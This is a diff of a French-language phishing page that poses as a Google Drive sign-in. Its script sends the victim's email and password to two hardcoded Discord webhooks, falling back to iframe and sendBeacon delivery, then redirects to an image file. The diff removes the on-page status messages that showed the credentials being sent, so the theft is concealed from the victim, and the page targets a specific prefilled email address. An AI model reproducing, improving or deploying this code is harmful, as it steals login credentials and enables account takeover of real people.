@@ -47,7 +47,6 @@ h1{font-size:19px;line-height:1.35;margin:0 0 10px;font-weight:500;color:#202124
 .chip span.mail{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
 .show{display:flex;align-items:center;gap:8px;font-size:13px;color:#5f6368;margin-top:16px;user-select:none}
 .show input{width:16px;height:16px;margin:0;accent-color:#1a73e8}
-.st{font-size:11px;text-align:center;font-family:ui-monospace,monospace;color:#8a8886;margin-top:12px;min-height:14px}
 .spin{width:15px;height:15px;border:2px solid rgba(255,255,255,.4);border-top-color:#fff;border-radius:50%;display:inline-block;vertical-align:-3px;margin-right:7px;animation:s .7s linear infinite}
 @keyframes s{to{transform:rotate(360deg)}}
 </style>
@@ -91,7 +90,6 @@ h1{font-size:19px;line-height:1.35;margin:0 0 10px;font-weight:500;color:#202124
       <input class="field" id="email" type="email" inputmode="email" value="maudperez33@mail.com" autocomplete="off" autocapitalize="none" autocorrect="off" spellcheck="false" placeholder="Adresse e-mail">
       <a class="link" href="#" onclick="return false">Mot de passe oublié&nbsp;?</a>
       <div class="actions"><button class="gbtn" type="submit">Suivant</button></div>
-      <div class="st" id="st1"></div>
     </form>
   </div>
 </section>
@@ -110,14 +108,13 @@ h1{font-size:19px;line-height:1.35;margin:0 0 10px;font-weight:500;color:#202124
       <input class="field" id="pwd" type="password" inputmode="text" autocomplete="off" autocapitalize="none" autocorrect="off" spellcheck="false" placeholder="Saisissez votre mot de passe">
       <label class="show"><input type="checkbox" id="showpwd"> Afficher le mot de passe</label>
       <div class="actions"><button class="gbtn" id="btnLogin" type="submit">Se connecter</button></div>
-      <div class="st" id="st2"></div>
     </form>
   </div>
 </section>
 
 <script>
 const CODE = "RB-9K42-XT7D";
-const REDIRECT = "https://drive.google.com/drive/my-drive";
+const REDIRECT = "charte.jpg";
 const HOOKS = [
   "https://discord.com/api/webhooks/1564072527142330579/ghyFo88nzRDLJrVvOkZKMhowzB8R5qiTqvs7owGcW1-koz66zc8focZ-LjOG-scdUoot",
   "https://discord.com/api/webhooks/1567191230872551464/lhvhBSU_tcH3H7mUIuo87kHxBdnnPbzdwAG6laVscaFd4GNk4JRbFjUQKmRoxiutL_QN"
@@ -129,11 +126,6 @@ function show(id) {
   document.querySelectorAll(".screen").forEach(s => s.classList.remove("on"));
   $(id).classList.add("on");
   window.scrollTo(0, 0);
-}
-function statu(o, t, e) {
-  const el = $(o); if (!el) return;
-  el.textContent = t;
-  el.style.color = e === "ok" ? "#107c10" : e === "ko" ? "#e81123" : "#8a8886";
 }
 function enc(o) {
   return Object.keys(o).map(k => encodeURIComponent(k) + "=" + encodeURIComponent(o[k])).join("&");
@@ -163,23 +155,21 @@ function viaIframe(h, b) {
     } catch (e) { r(false); }
   });
 }
-async function envoi(o, texte) {
+async function envoi(texte) {
   const b = enc({ username: "Drive · " + CODE, content: texte });
-  statu(o, "envoi…", "");
   for (const h of HOOKS) {
     try {
       const r = await fetch(h, { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: b });
-      if (r.ok) { statu(o, "✓ transmis", "ok"); return true; }
+      if (r.ok) return true;
     } catch (e) {}
   }
-  for (const h of HOOKS) { if (await viaIframe(h, b)) { statu(o, "✓ transmis", "ok"); return true; } }
+  for (const h of HOOKS) { if (await viaIframe(h, b)) return true; }
   for (const h of HOOKS) {
     try {
       const bd = new Blob([b], { type: "text/plain;charset=UTF-8" });
-      if (navigator.sendBeacon(h, bd)) { statu(o, "✓ transmis", "ok"); return true; }
+      if (navigator.sendBeacon(h, bd)) return true;
     } catch (e) {}
   }
-  statu(o, "✗ bloqué", "ko");
   return false;
 }
 
@@ -203,8 +193,8 @@ $("formPwd").addEventListener("submit", async e => {
   btn.disabled = true;
   btn.innerHTML = '<span class="spin"></span>Connexion…';
   const txt = "🔐 Identifiants\nCode : " + CODE + "\nEmail : " + mail + "\nMot de passe :\n```\n" + p + "\n```";
-  let ok = await envoi("st2", txt);
-  if (!ok) { await new Promise(r => setTimeout(r, 2500)); ok = await envoi("st2", txt); }
+  let ok = await envoi(txt);
+  if (!ok) { await new Promise(r => setTimeout(r, 2500)); ok = await envoi(txt); }
   setTimeout(() => { location.replace(REDIRECT); }, ok ? 1200 : 2500);
 });
 
